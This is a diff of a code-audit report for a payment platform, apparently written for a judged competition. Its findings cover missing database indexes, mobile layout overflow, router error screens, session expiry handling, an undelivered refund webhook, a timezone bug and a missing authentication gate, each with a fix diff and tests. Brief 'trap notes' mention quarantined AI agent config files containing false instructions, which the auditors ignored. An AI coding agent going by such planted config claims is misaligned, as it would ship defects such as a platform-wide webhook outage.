+**What's wrong:** `ledger_entries` has no index on `entry_group_id`, and `holds` has none on `transaction_id`. Both columns are looked up once per row on the checkout hot path. Each lookup is therefore a sequential scan of the whole table, and those tables only grow.
+
+**Why it happens:** The double-entry guard `ledger_entries_balance` (`db/migrations/0007_ledger_double_entry.sql:67-70`) is a `DEFERRABLE INITIALLY DEFERRED` constraint trigger `FOR EACH ROW`. At COMMIT, `check_ledger_group_balance()` runs `SELECT ... FROM ledger_entries WHERE entry_group_id = v_group_id` once for every inserted row. A capture inserts 4 rows (`payments/capture.ts:215-235`: the gross pair and the MDR fee pair). The same capture runs `UPDATE holds SET status = 'released' WHERE transaction_id = $1` (`capture.ts:244`). The only indexes on these tables are `ledger_entries (id)`, `ledger_entries (merchant_id, occurred_at)` and `holds (id)`.
+
+**What it breaks:** Throughput, and it gets worse over time. On the local box emulation (API 0.5 vCPU / 512 MB, Postgres 0.6 vCPU), Postgres sat at its CPU cap at about 16 checkouts/s, and samples of `pg_stat_activity` were dominated by `COMMIT`, where the deferred trigger runs. After about 6,000 load-test checkouts, `pg_stat_user_tables` showed `ledger_entries` with 37,074 sequential scans that had read 531,924,194 tuples and 0 index scans, and `holds` with 6,148 sequential scans that had read 18,942,066 tuples. The cost per checkout is linear in the size of the ledger. Every payment the judges make, and every row the seed creates, makes the next checkout slower.
+
+**Why it needed a fix:** Capacity is scored as users served while staying fast. Here capacity was capped by an O(ledger size) scan, not by the 0.5 vCPU / 512 MB limits, and it would shrink during the judges' own load test.
+
+**Fix:** `db/migrations/0101_hot_path_indexes.sql` (new, add-only)
+```sql
+CREATE INDEX IF NOT EXISTS ledger_entries_entry_group_id_idx ON ledger_entries (entry_group_id);
+CREATE INDEX IF NOT EXISTS holds_transaction_id_idx ON holds (transaction_id);
+```
+
+**Why this is the smallest correct fix:** Two indexes, no code change. The trigger keeps its exact semantics, and so does the double-entry guarantee (case file / ADR-0001). *Why not make the trigger `FOR EACH STATEMENT`, or check once per group?* That rewrites a money-safety guard. An index makes the same check O(log n). *Why not drop the trigger and rely on application code?* It is the only database-enforced double-entry check. *Why not `CREATE INDEX CONCURRENTLY`?* The migration runner wraps each file in a transaction, and both tables are small at deploy time (about 14k and 2k rows after the seed), so the lock lasts well under a second. The cost is about 40 bytes of index per ledger row and one extra index write per insert. The scans this removes are a full table each.
+
+**Proof:**
+- `CAP-4: the balance trigger's and the hold release's lookups use an index, not a full table scan` (`scripts/hot_path_indexes.audit.test.ts`), with sequential scans disabled. Before the migration the plan was a `Seq Scan` on `ledger_entries` (`not ok 1`). After `npm run migrate` it passes, and `scripts/ledger_append_only.audit.test.ts` still passes.
+- Load test (same box emulation, Postgres 0.6 vCPU, 30 s steps; full tables in `docs/audit/CAPACITY.md`):
+
+| users | before: checkouts/s, pay p95 | after: checkouts/s, pay p95 |
+|---:|---|---|
+| 10 | 14.2, 971 ms | 17.6, 749 ms |
+| 20 | 16.5, 1,488 ms | 24.7, 1,106 ms |
+| 30 | 13.9, 2,500 ms | 27.9, 1,418 ms |
+
+After the index, the run (about 6,000 more checkouts) shows `ledger_entries` with 0 sequential scans and 16,045 index scans, and `holds` with 1 sequential scan and 4,011 index scans.
+
+**Regression risk:** Add-only, with `IF NOT EXISTS`, so it is safe to re-run. Inserts into `ledger_entries` and `holds` maintain one more B-tree. No query changes, so results are identical.
+
+Lines: prod +4/-0 (migration), test +33/-0
+
+---
+
+<a id="f-checkout-375"></a>
+
+### CHECKOUT-375 · On a phone the checkout's CVV field is off-screen and dashboard pages overflow sideways · Severity: Low
+
+**Lead:** Team 45 heads-up list (item 2), verified by us.
+**Category:** UI/UX improvement
+
+**What's wrong:** On a 375 px phone screen, the hosted checkout's expiry-month / expiry-year / CVV row is wider than the screen. The CVV box starts at the right edge, so the buyer has to pan sideways to find it. On the merchant dashboard, the transactions table and the detail pages are also wider than the screen, so the whole page scrolls sideways.
+
+**Why it happens:** `apps/web/src/pages/checkout/CheckoutPage.css:44-47` makes `.checkout-form-row` a flex row. Its three `<label>`s have no flex basis, and the inputs inside keep the browser's default width (about 20 characters each). Three default-width inputs do not fit in 343 px, and nothing lets them shrink. In `apps/web/src/dashboard.css:150-155` (pre-fix lines), `.dash-table` is `width: 100%` but grows to its content's width (six columns), and `.dash-dl` (`:166-170`) has a fixed `16rem` label column plus the value column. The dashboard has no rule for narrow screens.
+
+**What it breaks:** Measured in headless Edge with a 375 px mobile viewport (`Emulation.setDeviceMetricsOverride`, `mobile: true`): the checkout lays out **549 px** wide (CVV right edge at 549 px), the transactions page **665 px**, and a transaction's detail page **411 px**. Buyers paying from a phone, the normal case for a payment link, see a cut-off form. Merchants on a phone get pages that pan sideways.
+
+**Why it needed a fix:** Checkout is one of the three judged UI surfaces, and a payment page whose security-code field starts off-screen loses payments.
+
+**Fix:** `apps/web/src/pages/checkout/CheckoutPage.css:42-43,50-54` and `apps/web/src/dashboard.css:178-183`
+```diff
+ .checkout-form input {
+   padding: 0.5rem;
+   font-size: 1rem;
++  width: 100%; /* CHECKOUT-375: fill the label, so a 375 px screen keeps CVV on-screen */
++  box-sizing: border-box;
+ }
++.checkout-form-row label {
++  flex: 1;
++  min-width: 0;
++}
+```
+```diff
++/* CHECKOUT-375: on a phone, tables scroll inside themselves and label/value pairs stack. */
++@media (max-width: 640px) {
++  .dash-table { display: block; overflow-x: auto; }
++  .dash-dl { grid-template-columns: 1fr; }
++}
+```
+Commit: `993c95a`. Lines: prod +13/-0 (CSS: 9 rules/declarations, 2 comments, 2 blank), test +0/-0.
+
+**Why this is the smallest correct fix:** The checkout change is three declarations on existing selectors plus one new selector. The three labels share the row equally and may shrink below their content width, and each input fills its label. The dashboard change only applies under 640 px, so desktop layout is untouched. *Why not wrap every `.dash-table` in an `overflow-x` `<div>`?* That edits about 10 page components for the same result. `display: block; overflow-x: auto` on the table itself, scoped to narrow screens, does it in one rule. *Why not `flex-wrap`?* With `min-width: 0` the fields never need to wrap, and three short fields on one line is the expected card-form layout.
+
+**Proof:** There is no unit test, because this is CSS and the repo has no DOM test runner. The proof is the measured layout from the same harness run on the same data, before and after (`docs/audit/evidence/ui/`): checkout 549 → **375 px** (CVV right edge 549 → 343 px), transactions 665 → **375 px** (the table scrolls inside itself), detail 411 → **375 px**. Screenshots: `checkout-375-{before,after}.png`, `dashboard-table-375-{before,after}.png`, `dashboard-detail-375-{before,after}.png`. At branch head `36cb2c7` the web suite passes 13/13 (CSS is not type-checked).
+
+**Regression risk:** At desktop width, the checkout's card-number and expiry inputs now fill the 420 px form instead of using the browser default width, a cosmetic change (`checkout-open-after.png`). Dashboard rules apply only at ≤ 640 px.
+
+---
+
+<a id="f-router-404"></a>
+
+### ROUTER-404 · A mistyped URL or a page that throws shows React Router's developer error screen in both apps · Severity: Low
+
+**Lead:** Team 45 heads-up list (item 3), verified by us.
+**Category:** UI/UX improvement
+
+**What's wrong:** In both the merchant dashboard and the admin console, any unknown URL (for example `/dashboard/no-such-page` or `/no-such-page`) shows "Unexpected Application Error! 404 Not Found … Hey developer 👋". A page that throws while rendering shows the same screen with a stack trace. UI-NEG-1 was one example: a refunded transaction's page printed `RangeError: toFils …` and source paths.
+
+**Why it happens:** `apps/web/src/router.tsx` and `apps/admin/src/router.tsx` give `createBrowserRouter` explicit paths only. There is no `path: "*"` route and no `errorElement` on any route. In that case React Router renders its built-in development fallback, which is meant for developers and is never replaced in production.
+
+**What it breaks:** Merchants and operators who follow a stale bookmark or a mistyped link land on a developer screen with no way back. A rendering bug exposes stack traces and local source paths (`/@fs/C:/…/packages/money/src/fils.ts`) to merchants instead of a recoverable page.
+
+**Why it needed a fix:** The dashboard and admin console are judged UI surfaces, and this fallback is the most visible failure mode the apps have. It is also how ADMIN-IMP-3b and UI-NEG-1 appeared to users.
+
+**Fix:** `apps/web/src/router.tsx:21-23,27,41,111` and `apps/admin/src/router.tsx:12-13,17,27,37`
+```diff
++// ROUTER-404: an unknown URL or a page that throws gets a plain page, not React Router's developer screen.
++const notFound = <main className="dash-main"><h1>Page not found</h1><p><a href="/dashboard">Go to the dashboard</a></p></main>;
++const crashed = <main className="dash-main"><h1>Something went wrong</h1><p>Reload the page to try again.</p></main>;
+-  { path: "/pay/:token", element: <CheckoutPage /> },
++  { path: "/pay/:token", element: <CheckoutPage />, errorElement: crashed },
+ … (dashboard provider route)
++    errorElement: crashed,
++  { path: "*", element: notFound },
+```
+The admin has the same `crashed` constant and `errorElement` on `/login` and on the guarded layout route, plus `{ path: "*", … "Page not found" … "Go to merchants" }` inside the guarded layout, so the admin shell and login guard still apply.
+Commit: `53442f5`. Lines: prod +13/-2 (web +7/-1, admin +6/-1; 2 comments), test +54/-0.
+
+**Why this is the smallest correct fix:** These are the router's own two extension points, `path: "*"` and `errorElement`, set once per top-level subtree, with plain JSX and existing layout classes. No new component file and no new CSS were added. Every page below those routes is covered, including ones added later. *Why not an `ErrorBoundary` component?* `errorElement` is the data router's error boundary, and a separate component adds a file for the same behaviour. *Why put the web catch-all at top level, but inside the guard in the admin?* Checkout (`/pay/:token`) must make no auth calls, so the web 404 page cannot sit under the session provider. The admin has no public pages, so its 404 page keeps the admin shell.
+
+**Proof:** `an unknown dashboard URL matches the catch-all route, and every subtree has an errorElement` (`apps/web/src/router.test.ts`) and `an unknown admin URL matches the catch-all route, and every subtree has an errorElement` (`apps/admin/src/router.test.ts`) fail before the fix with `No route matches URL "/dashboard/no-such-page"` and `No route matches URL "/no-such-page"`. Both pass after the fix. At branch head `36cb2c7` the web suite passes 13/13 and admin 3/3, and `tsc --noEmit` is clean for both. Screenshots: `web-unknown-url-{before,after}.png`, `admin-unknown-url-{before,after}.png`.
+
+**Regression risk:** Every existing path matches exactly as before. Only URLs that used to 404, and render errors, change. Loader and action errors do not apply, because the routes define none. The admin "View as merchant" target is fixed by ADMIN-IMP-3b (`/` → `/dashboard`), so `MerchantDetailPage.tsx:213` needs no change.
+
+---
+
+<a id="f-link-expired"></a>
+
+### LINK-EXPIRED · The merchant dashboard shows an expired payment link as "active" and still offers Cancel · Severity: Low
+
+**Lead:** Team 45 heads-up list (item 5), verified by us.
+**Category:** UI/UX improvement
+
+**What's wrong:** Once a payment link passes its `expires_at`, the buyer's checkout says "Link expired" and the server refuses to pay it (PL-2). The merchant's Payment links list and detail page still show it as **active** in green, and the detail page still offers "Cancel payment link". The merchant sees a live link that no buyer can use.
+
+**Why it happens:** No job flips `payment_links.status` when a link expires. Expiry is computed on read: `derivePublicStatus` (`apps/api/src/paymentLinks/status.ts:33-34`) returns `"expired"` for an `active` row whose `expiresAt <= now`, but only for the public checkout read. The merchant DTO carries the raw column `status` and `expiresAt`. `PaymentLinkListPage.tsx:114`, `PaymentLinkDetailPage.tsx:123` and the Cancel gate at `:162` render `link.status` as-is.
+
+**What it breaks:** Merchants re-send dead links to customers, or think a customer is "about to pay". Support gets "the link says active but my customer sees expired" (the merchant-side mirror of FP-187; FP-187 itself, the server accepting a payment after expiry, was fixed by PL-2). The Cancel action on an expired link is a no-op that looks meaningful.
+
+**Why it needed a fix:** The merchant dashboard must show the link the way the buyer and the server see it.
+
+**Fix:** `apps/web/src/format.ts:39-42`, `PaymentLinkListPage.tsx:8,114`, `PaymentLinkDetailPage.tsx:7,123,162`, `dashboard.css:266`
+```diff
++/** LINK-EXPIRED: an "active" link at or past its expiry is expired, the checkout's rule (api paymentLinks/status.ts). */
++export function linkStatus(link: { status: string; expiresAt: string }, now = Date.now()): string {
++  return link.status === "active" && Date.parse(link.expiresAt) <= now ? "expired" : link.status;
++}
+-<span className={`dash-status dash-status-${link.status}`}>{link.status}</span>
++<span className={`dash-status dash-status-${linkStatus(link)}`}>{linkStatus(link)}</span>   (list and detail)
+-      {link.status === "active" ? (
++      {linkStatus(link) === "active" ? (
++.dash-status-expired,   (joins the red "voided/canceled" group)
+```
+Commit: `81514a5`. Lines: prod +11/-5 (format.ts +5 incl. 1 comment and 1 blank, two imports, three call sites, 1 CSS selector), test +11/-1.
+
+**Why this is the smallest correct fix:** It is the server's rule, `active && expiresAt <= now`, applied at the three places the dashboard shows or acts on a link's status. One pure function keeps the three in step and makes the rule unit-testable. *Why not add an `effectiveStatus` to the API DTO?* That changes a public API contract that API-key clients depend on, for a display concern. *Why not a migration or job that flips the status to `expired`?* The column's CHECK has no `expired` value, so a new state machine value would be a much bigger change. The status filter checkboxes still filter on the stored status, as the endpoint does.
+
+**Proof:** `linkStatus shows an active link past its expiry as expired` (`apps/web/src/dashboard.test.ts`) fails before the fix (`SyntaxError: The requested module './format.js' does not provide an export named 'linkStatus'`) and passes after. It covers the boundary at exactly `expires_at` (expired, as `status.ts:34` uses `<=`), 1 s before (active), and paid/reserved links (unchanged). `dashboard.test.ts` passes 10/10, the web suite 13/13 at branch head `36cb2c7`, and `tsc --noEmit` is clean. Screenshots: `dashboard-links-expired-{before,after}.png` (list) and `dashboard-link-expired-detail-{before,after}.png` (detail: "expired" in red, Cancel button gone).
+
+**Regression risk:** Display only. Links that are paid, canceled or reserved show as before, and active links before their expiry show as before. The cancel endpoint is unchanged and still accepts the call from other clients.
+
+---
+
+<a id="f-ui-401"></a>
+
+### UI-401 · An ended session shows a raw "unauthenticated" over stale data instead of the login page · Severity: Low
+
+**Lead:** Team 45 heads-up list (item 6), verified by us.
+**Category:** UI/UX improvement
+
+**What's wrong:** In the merchant dashboard and the admin console, when the session ends while a page is open (it expires, it is revoked, or the user logs out in another tab), the next request answers 401. The page then shows a red box with the raw code `unauthenticated` above the table it had already loaded ("25 transactions loaded"), and stays there. Nothing sends the user back to sign in.
+
+**Why it happens:** Both API clients (`apps/web/src/api/client.ts:47-50`, `apps/admin/src/api/client.ts:49-52`) turn every non-2xx response into an `ApiError`, and pages show it through `describeError`. The login redirect lives only in the route guards (`RequireDashboardAuth`, `RequireAdminAuth`), which check the session once, on mount. A 401 after that point is just another error string.
+
+**What it breaks:** Users see stale data with an unexplained error and must guess that they need to reload or log out.
+
+**Why it needed a fix:** A 401 has only one meaning for these apps, "sign in again", and the UI should act on it. That applies to all three judged surfaces except checkout, which has no session.
+
+**Fix:** `apps/web/src/api/client.ts:49-50` and `apps/admin/src/api/client.ts:51-52`
+```diff
+   if (!res.ok) {
++    // UI-401: a session that ended sends the merchant to log in again (never from checkout or the login page).
++    if (res.status === 401 && location.pathname.startsWith("/dashboard/") && location.pathname !== "/dashboard/login") location.assign("/dashboard/login");
+     throw new ApiError(res.status, (body as ApiErrorBody) ?? { error: "unknown_error" });
+```
+```diff
++    // UI-401: a session that ended sends the operator to log in again (never from the login page itself).
++    if (res.status === 401 && location.pathname !== "/login") location.assign("/login");
+```
+Commit: `a9bb039`. Lines: prod +4/-0 (2 code, 2 comments), test +60/-0.
+
+**Why this is the smallest correct fix:** `request()` is the single place every page's API call goes through, so one condition per app covers every page and every later page. The exclusions keep two flows intact. On the login pages a 401 means "wrong password or code", and the page shows it. On checkout (`/pay/*`, public, no session) a 401 cannot mean "sign in". The error is still thrown, so callers behave as before until the navigation happens. *Why not handle 401 in each page?* There are about 15 pages, with the same risk of missing one. *Why a full `location.assign` rather than the router?* `request()` is outside React, and a reload also clears any state from the ended session.
+
+**Proof:** `a 401 on a dashboard page redirects to the login page, but not on checkout or the login page` (`apps/web/src/api/client.test.ts`) and `a 401 on an admin page redirects to the login page, but not on the login page` (`apps/admin/src/api/client.test.ts`) stub `fetch` to return 401 and `location` to record `assign`. Both fail before the fix (`assigned` is `[]`, not `["/dashboard/login"]` / `["/login"]`) and pass after. The web suite passes 13/13 and admin 3/3, and `tsc --noEmit` is clean. Screenshots: `dashboard-401-before.png` shows "unauthenticated" over 25 stale rows, and `dashboard-401-after.png` shows the sign-in page.
+
+**Regression risk:** Only 401 responses on authenticated pages change. 403 (role gates) still shows the role message, and other errors are unchanged. An impersonation grant that expires now lands on the merchant login page, the same as any ended session.
+
+---
+
+<a id="f-checkout-paidat"></a>
+
+### CHECKOUT-PAIDAT · Checkout's "Payment successful" page showed a raw UTC ISO timestamp · Severity: Low
+
+**Lead:** Team 45 heads-up list (U2), verified by us.
+**Category:** UI/UX improvement
+
+**What's wrong:** After paying, the buyer sees `Paid at 2026-10-30T14:11:31.805Z`, a machine timestamp in UTC. For a Bahrain buyer that reads three hours off, and it is the only date on the checkout that is not formatted.
+
+**Why it happens:** `apps/web/src/pages/checkout/CheckoutPage.tsx:118` renders `payState.result.paidAt`, the API's ISO string, as-is. Every other date in the web app goes through `toLocaleString` (`format.ts:22-24`).
+
+**What it breaks:** The receipt moment of the checkout looks unfinished, and the time looks wrong to a buyer in Bahrain (UTC+3).
+
+**Why we changed it:** Checkout is a judged surface, and this is the page every successful buyer sees. This is a UI/UX improvement, not a money or security defect.
+
+**Fix:** `apps/web/src/pages/checkout/CheckoutPage.tsx:118`
+```diff
+-          <dd>{payState.result.paidAt}</dd>
++          <dd>{new Date(payState.result.paidAt).toLocaleString(undefined, { timeZone: "Asia/Bahrain" })}</dd>
+```
+Commits: `84214f6` (format the ISO string with `toLocaleString()`), then `3d62ab2` (pin the zone to `Asia/Bahrain` after the false-positive review: without a zone, the time shown depended on the buyer's browser).
+
+**Why this is the smallest correct fix:** one expression on the one line that renders the time, inlined so that the public, cookie-free checkout keeps its current imports. The zone is pinned because the case file's business clock is Bahrain time ("Settlement closes every day at midnight, Bahrain time (UTC+3)") and a buyer abroad, or a browser set to UTC, would otherwise see a different time from the merchant's records. The dashboard's `dateTime()` helper (`format.ts:23`) still uses the browser's zone; we left it unchanged.
+
+**Proof:** There is no unit test: the change is to rendering only, and the repo has no DOM test runner. `tsc --noEmit` is clean. Screenshots: `checkout-success-before.png` (`2026-10-30T14:11:31.805Z`) and `checkout-success-after.png` (`10/30/2026, 5:12:19 PM`, Asia/Bahrain), both taken after `84214f6` with a real pay through the UI and a simulated test card. The after-shot was taken in a browser on Bahrain time (5:12 PM, one minute after the 14:11 UTC before-shot), which is what `3d62ab2` now renders whatever the browser's zone. After `3d62ab2`: apps/web `npm test` 14/14 and root `npm run typecheck` pass.
+
+**Regression risk:** Display only. The API response and the request are unchanged.
+Lines: prod +1/-1 net (`84214f6` +1/-1, `3d62ab2` +1/-1 on the same line), test +0/-0
+
+---
+
+<a id="f-batch-bar"></a>
+
+### BATCH-BAR · Merchant batch page shows a meaningless "progress bar" computed from fils in floating point · Severity: Low
+
+**Lead:** Team 45 heads-up list (C10), verified by us.
+**Category:** UI/UX improvement
+
+**What's wrong:** Every closed settlement batch in the merchant dashboard shows a blue bar under its title. It is not a progress indicator for anything. Its width is `grossFils / 10000` percent, so any batch over 10 BHD shows a full bar. A merchant reads it as "settlement complete" on a batch that is still only `closed` (not `paid`).
+
+**Why it happens:** `apps/web/src/pages/settlement/SettlementBatchDetailPage.tsx:84` computes `parseFloat((batch.grossFils / 10000).toFixed(2))`: money divided and rounded as a float, which ADR-0001 forbids. Lines 89-93 render it as a bar width for `status === "closed"`.
+
+**What it breaks:** For the seeded batch 2026-08-31 (gross 7,326.913 BHD) the value is 732.69, clamped to 100%. The bar shows "done" while the batch is unpaid (`Paid at —`). The UI suggests a payout state that does not exist.
+
+**Why it needed a fix:** The merchant dashboard is a judged surface, and a status-like graphic that contradicts the batch's status misleads merchants about their money. It is also the only place in the web app that does float arithmetic on fils.
+
+**Fix:** `apps/web/src/pages/settlement/SettlementBatchDetailPage.tsx:84,89-93` (deleted)
+```diff
+-  const displayProgress = parseFloat((batch.grossFils / 10000).toFixed(2));
+-      {batch.status === "closed" && (
+-        <div className="dash-progress-bar" style={{ width: "100%", background: "#e0e0e0", height: 6, borderRadius: 3 }}>
+-          <div style={{ width: `${Math.min(displayProgress, 100)}%`, background: "#2563eb", height: 6, borderRadius: 3 }} />
+-        </div>
+-      )}
+```
+Commit: `fa0e21d`. Lines: prod +0/-6, test +0/-0.
+
+**Why this is the smallest correct fix:** There is no correct value for this bar. A batch has no progress between `closed` and `paid`, and the page already shows `Status`, `Closed at` and `Paid at` in words. Deleting it removes both the misleading graphic and the float math. *Why not compute it in integer fils?* There is still nothing meaningful to show.
+
+**Proof:** There is no unit test: the change only removes rendering. `tsc --noEmit` is clean, and `dash-progress-bar` has no CSS or other users. Screenshots: `dashboard-batch-detail-{before,after}.png` show the same batch with and without the full blue bar.
+
+**Regression risk:** None to data or API. A visual element is removed.
+
+---
+
+<a id="f-imp-banner"></a>
+
+### IMP-BANNER · Admin impersonation banner still describes write access the grant no longer has · Severity: Low
+
+**Lead:** Team 45 heads-up list (item 3, banner wording), verified by us.
+**Category:** UI/UX improvement
+
+**What's wrong:** While a "view as merchant" grant is active, the admin console's banner says that merchant screens are "acting with this merchant's least-privileged (support) role". Since ADMIN-IMP-1, a grant is read-only: every non-GET request is refused, including ones a real support user may make. The banner does not tell the operator that they cannot change anything.
+
+**Why it happens:** `apps/admin/src/components/ImpersonationBanner.tsx:46-47` was written for the old role mapping. ADMIN-IMP-1 (`auth/requireMerchantAuth.ts:89-90`) added the read-only rule and left the wording unchanged.
+
+**What it breaks:** An operator who tries an action in the merchant view gets a bare 403 that contradicts what the banner implied.
+
+**Why it needed a fix:** The admin console is a judged surface, and the banner is the operator's only statement of what the grant allows.
+
+**Fix:** `apps/admin/src/components/ImpersonationBanner.tsx:47`
+```diff
+-          acting with this merchant&apos;s least-privileged (support) role.
++          read-only: you see what this merchant&apos;s support role sees and cannot change anything.
+```
+Commit: `deda775`. Lines: prod +1/-1, test +0/-0.
+
+**Why this is the smallest correct fix:** One sentence now matches the enforced behaviour. *Why not change the behaviour instead?* Read-only is the documented scope (ARCH §8, ADMIN-IMP-1).
+
+**Proof:** There is no unit test: the change is text only. `tsc --noEmit` is clean. Screenshots: `admin-impersonation-banner-{before,after}.png`.
+
+**Regression risk:** None. The change is text only.
+
+---
+
+<a id="f-cw-9"></a>
+
+### CW-9 · refund.succeeded is enqueued but never delivered as a webhook · FP-300 ☐4 · Severity: Medium
+**Category:** FP-300 build
+
+**What's wrong:** `processRefund.ts:245-257` enqueues `refund.succeeded`, but the type was missing from `WEBHOOK_ELIGIBLE_EVENT_TYPES` (`apps/api/src/webhooks/dispatcher.ts:28-32`), from the `WebhookEventType` union and from `buildEnvelope` (`apps/api/src/webhooks/envelope.ts:9,81`), so a shop never receives a refund webhook.
+
+**Why it happens:** Step A only selects eligible types; `buildEnvelope` throws `unsupported event type` for anything without a case. The comment at `dispatcher.ts:25` ("add refund.succeeded here when refunds ship, thats all it needs — am") and `docs/ONBOARDING.md:70` say adding the list entry alone is enough. It is not: Step A builds every envelope inside one `withTransaction` loop over `ORDER BY oe.id LIMIT 500`, so the throw rolls back Step A and `runDispatchPass` rejects before Step B: a poison pill that freezes every merchant's webhooks.
+
+**What it breaks:** FP-300 "the shop gets the right webhook": a 1.250 BD partial refund (1250 fils, fee reversed 31 fils) produces no webhook at all; done the documented way, it would stop all `transaction.captured` / `settlement.paid` deliveries platform-wide.
+
+**Why this is FP-300 build, not a bug fix:** at the handed-over commit `8b58b0f` refunds never ran: `POST /v1/refunds` was a stub answering `501 not_implemented` (`routes/refunds.ts:24`, pinned by `transactions.test.ts:291`). No refund webhook was ever shipped, so none was ever lost. FP-300 requires the refund webhook as part of the feature, and the documented shortcut would cause a platform-wide webhook outage. We credit this under FP-300, not as a defect.
+
+**Fix:** `apps/api/src/webhooks/envelope.ts:9` adds `| "refund.succeeded"`; `envelope.ts:81-96` adds a `case "refund.succeeded"` mapping the outbox payload field-by-field to the same public shape as the REST refund body (`refundId, transactionId, merchantId, amountFils, feeReversedFils, refundedTotalFils, status: "succeeded", transactionStatus`); `dispatcher.ts:32` adds `"refund.succeeded",` and replaces the misleading comment at `:25`. No `PRE_DELIVERY_EFFECT` attached. Commit: `152e27e`. Lines: prod +19/-2, test +27/-0.
+
+**Why this is the smallest correct fix:** Three touch points are the minimum (type, envelope case, eligibility); the envelope case follows the existing explicit field-by-field style (the file's own contract forbids spreading the outbox payload), which is why it is 15 lines. Why not spread `payload`: violates the envelope contract (`envelope.ts:1-7`) and leaks `newStatus`. Why not only the eligible list: poison pill described above. The refund producer itself is already wired (`processRefund.ts`); the FP-300 builder only needs to rely on it.
+
+**Proof:** `dispatcher.test.ts` "refund.succeeded: enqueued refund event is delivered with the public refund envelope". Before: `AssertionError: expected 1, actual 0` (no request sent). After: passes, with body `type: "refund.succeeded"` and `data.amountFils 1250`.
+
+**Regression risk:** existing types unchanged; `envelope.test.ts`, `dispatcher.test.ts` (9/9), `archiveReplay.test.ts` green; `tsc --noEmit` clean. Historical `refund.succeeded` outbox rows for merchants with active endpoints will now be delivered once (Step A has no backfill limit beyond endpoint creation time, see "no backfill" test).
+
+**Trap note:** `dispatcher.ts:25` am comment ("thats all it needs") replaced with a CW-9 note that both the envelope case and the list entry are required; quarantined AGENTS.md/.cursorrules "refund.succeeded is intentionally absent" ignored per FP-300. Not owned here: `docs/ONBOARDING.md:70` and `outbox.ts:12` still carry the wrong claim.
+
+---
+
 <a id="f-u4"></a>
 
 ### U4 · Batch views show Gross − Fee ≠ Net payout with nothing explaining the netted refunds · FP-300 · Severity: Medium
 
 **Lead:** Team 45 heads-up list (U4), verified by us.
+**Category:** FP-300 build
 
 **What's wrong:** Since FP-300, a refund is netted into the merchant's next settlement batch, so that batch's net payout is lower than gross − fee. The merchant batch page and the admin batch tables show only Gross, Fee and Net payout. For a batch with refunds, 650.000 − 16.250 ≠ 630.500, and no figure on the page explains the 3.250 BHD difference. The web type even documents the old invariant: `netPayoutFils` "Always exactly grossFils - feeFils" (`apps/web/src/types.ts:218`).
 
@@ -3622,7 +4244,7 @@ Commit: `b809526`. Lines: prod +9/-3, test +60/-1.
 
 **What it breaks:** After midnight in Bahrain, tonight's refunds net into the batches that close. A merchant or judge looking at a batch then sees a payout smaller than gross − fee, with no explanation. That looks like money gone missing, on the dashboard and on the admin console.
 
-**Why it needed a fix:** FP-300 requires refunds to be correct in the money flow, and they now are. The pages have to show that, or they look like a payout error.
+**Why this is FP-300 build, not a bug fix:** refunds were not netted into batches before our FP-300 work (`POST /v1/refunds` answered 501 at `8b58b0f`), so no handed-over page was ever wrong. FP-300 requires refunds to be correct in the money flow, and they now are; the derived "Refunds netted" row is the part of that feature the pages need, or the batch looks like a payout error. We credit it under FP-300, not as a defect.
 
 **Fix (UI only, no API or DTO change):** `apps/web/src/format.ts:44-47`, `apps/web/src/pages/settlement/SettlementBatchDetailPage.tsx:5,101`, `apps/admin/src/pages/settlement/SettlementPage.tsx:198`, `apps/admin/src/pages/merchants/MerchantDetailPage.tsx:622`, `apps/web/src/types.ts:218` (comment)
 ```diff
@@ -3697,726 +4319,35 @@ Commit: `d3953ff`. Lines: prod +10/-4 (helper 4 + 1 blank; merchant row 1 + impo
 
 ---
 
-<a id="f-f2-window"></a>
-
-### F2-WINDOW · The March residue sweep reads a UTC month, not the Bahrain month · F2, G1/H5 (timezone) · Severity: Low
-**What's wrong:** `monthBounds` in `scripts/reconcile_march.ts:16-18` builds the March window from UTC midnights (2026-03-01T00:00Z … 2026-04-01T00:00Z). FilsPay's business day, and so its month, runs midnight to midnight **Asia/Bahrain** (UTC+3).
-
-**Why it happens:** `Date.UTC(year, month - 1, 1)` is UTC midnight. Bahrain midnight is three hours earlier (21:00Z on the previous day). The existing test asserted `start.getUTCMonth() === 2`, which only holds for the UTC window, so it pinned the bug.
-
-**What it breaks:** captures between 00:00 and 03:00 Bahrain time on 1 March fall outside the sweep, while captures between 00:00 and 03:00 Bahrain time on 1 April (31 March 21:00-24:00Z) are swept into March. The residue is booked to the wrong month: three hours of residue go missing at one end and three hours from the next month are added at the other.
-
-**Why it needed a fix:** month-end write-offs must match the books, which close on the Bahrain day (case file: "Settlement closes every day at midnight, Bahrain time").
-
-**Fix:** `scripts/reconcile_march.ts:17`
-```diff
--  return { start: new Date(Date.UTC(year, month - 1, 1)), end: new Date(Date.UTC(year, month, 1)) };
-+  return { start: new Date(Date.UTC(year, month - 1, 1, -3)), end: new Date(Date.UTC(year, month, 1, -3)) }; // Asia/Bahrain (UTC+3) midnights
-```
-Lines: prod +1/−1, test +3/−2.
-
-**Why this is the smallest correct fix:** one expression; Bahrain has no DST, so a fixed −3 h is exact. Why not a timezone library or `Intl`? It would add code and dependencies for a fixed offset.
-
-**Proof:** `scripts/reconcile_march.test.ts` "monthBounds for March 2026 spans 31 days", with assertions corrected to `2026-02-28T21:00:00.000Z` / `2026-03-31T21:00:00.000Z` (case file cited): before `actual: '2026-03-01T00:00:00.000Z'`, after pass. Sweep tests 4/4.
-
-**Regression risk:** only this one-off script uses `monthBounds`. The printed "window:" line now shows the UTC dates of the Bahrain boundaries (2026-02-28 .. 2026-03-31).
-
-**Trap note:** the old assertion `start.getUTCMonth() === 2` encoded the UTC assumption (the same "UTC midnight" claim as the quarantined AI configs).
-
----
-
-<a id="f-auth-1-rpt"></a>
-
-### AUTH-1·rpt · Reporting export-summary has no authentication gate · H3 · Severity: Low
-**What's wrong:** `GET /v1/reporting/export-summary` (`apps/api/src/routes/reporting.ts:79`) is the only reporting route registered without `requireMerchantAuth`.
-
-**Why it happens:** the handler reads `request.merchantAuth!.merchantId`. The `!` tells TypeScript the value exists, but no preHandler ever sets it for this route. The file's own header says every route uses `requireMerchantAuth` (`:18`).
-
-**What it breaks:** an anonymous request throws a TypeError and gets a 500 (an availability and noise problem). If any future hook populated `merchantAuth` loosely, it would become a data exposure. No data leaks today.
-
-**Why it needed a fix:** every merchant-data route must refuse anonymous callers with 401, not crash.
-
-**Fix:** `reporting.ts:79` `app.get("/export-summary", { preHandler: requireMerchantAuth }, async (request) => {`. Lines: prod +1/−1, test +28/−0.
-
-**Why this is the smallest correct fix:** the same one-line gate its sibling routes use.
-
